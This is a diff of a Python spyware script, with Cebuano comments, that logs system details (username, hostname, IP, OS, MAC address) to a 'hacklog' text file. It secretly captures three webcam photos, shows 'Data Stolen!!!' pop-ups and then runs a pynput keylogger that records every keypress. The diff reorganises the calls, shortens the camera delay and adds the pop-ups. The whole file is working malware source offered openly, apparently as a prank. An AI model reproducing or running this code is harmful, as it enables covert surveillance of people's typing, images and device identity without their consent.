@@ -1,18 +1,17 @@
 from datetime import datetime
-import os 
 import getpass
 import socket
 import platform
-import uuid
 from getmac  import get_mac_address as gma
 from pynput import keyboard
 import cv2
 import time
-
+import tkinter as tk
+from tkinter import messagebox
 
 textname = 'meow_meow_hacklog.txt'
-
-
+Enable_PopUps = 1 # Set to 1 if you want pop-ups, 0 if not
+PopUps = 10
 
 def dateandtime():
     dateandtimenow = datetime.now()
@@ -21,16 +20,12 @@ def dateandtime():
         file.write('DATE AND TIME RAN: \n'+ str(dateandtimenow) + '\n')
         file.write('\n')
 
-dateandtime()
-
-
 def username():
     usernameofpc = getpass.getuser()
     with open(textname, 'a') as file:
 
         file.write('PC USERNAME: \n'+ str(usernameofpc) + '\n')
         file.write('\n')
-username()
 
 def devname():
     devicename = socket.gethostname()
@@ -38,7 +33,6 @@ def devname():
 
         file.write('DEVICE NAME: \n'+ str(devicename) + '\n')
         file.write('\n') 
-devname()
 
 def ipaddr():
     devicename = socket.gethostname()
@@ -48,10 +42,6 @@ def ipaddr():
             file.write('IP: \n'+ str(ipaddress) + '\n')
             file.write('\n') 
 
-
-ipaddr()
-
-
 def osnameversion():
 
     osname = platform.uname()
@@ -59,9 +49,6 @@ def osnameversion():
 
             file.write('OS NAME: \n'+ str(osname) + '\n')
             file.write('\n') 
-
-
-osnameversion()
 
 def cpuarchi():
 
@@ -71,23 +58,17 @@ def cpuarchi():
             file.write('CPU ARCHITECTURE: \n'+ str(cpu) + '\n')
             file.write('\n') 
 
-
-cpuarchi()
-
-
 def macaddr():
     mac_addr = gma()
     with open(textname, 'a') as file:
             file.write('MAC ADDRESS: \n'+ str(mac_addr) + '\n')
             file.write('\n') 
-macaddr()
 
-
-def capture_image(start_num, end_num, base_name = 'py_pic', delay=5):
+def capture_image(start_num, end_num, base_name = 'py_pic', delay=1): #1 second delay para quick surprise HEHE
     cam = cv2.VideoCapture(0)
     for i in range(start_num, end_num + 1):
         successful, frame = cam.read() 
-        pic_name = f" [ENTER FILE PATH HERE]: {base_name}{i}.png"
+        pic_name = f"{base_name}{i}.png" # Ghe change naku ni naku gamay para ma save sa same folder
         if successful:
             cv2.imwrite(pic_name, frame)
   
@@ -97,9 +78,6 @@ def capture_image(start_num, end_num, base_name = 'py_pic', delay=5):
              time.sleep(delay)
     cam.release()
     cv2.destroyAllWindows()
-
-capture_image(1, 3)
-
 
 def on_press(key):
     with open(textname, 'a') as file:
@@ -114,7 +92,35 @@ def on_press(key):
             file.write("\n[Keylogger stopped]\n")
             file.close()
             return False  # This stops the listener
+        
 
+def On_PopUp():
+    if Enable_PopUps == 1:
+        root = tk.Tk()
+        root.withdraw()  # Hide the main window
+
+        def show_popup(n):
+            if n < PopUps:
+                messagebox.showerror("ERROR", f"Data Stolen!!!... ({n+1})")
+                root.after(100, lambda: show_popup(n + 1))
+            else:
+                root.destroy()
+
+        show_popup(0)
+        root.mainloop()
+
+
+dateandtime()
+username()
+devname()
+ipaddr()
+osnameversion()
+cpuarchi()
+macaddr()
+capture_image(1, 3)
+show_popup = On_PopUp()  # Call the popup function add ug short message nga gi kawatan ug data AHHAHA
+
+# Akung ghe balhin ari ang method call para ma klaru naku nya organized pero nindot natu imoha akoa raning style
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
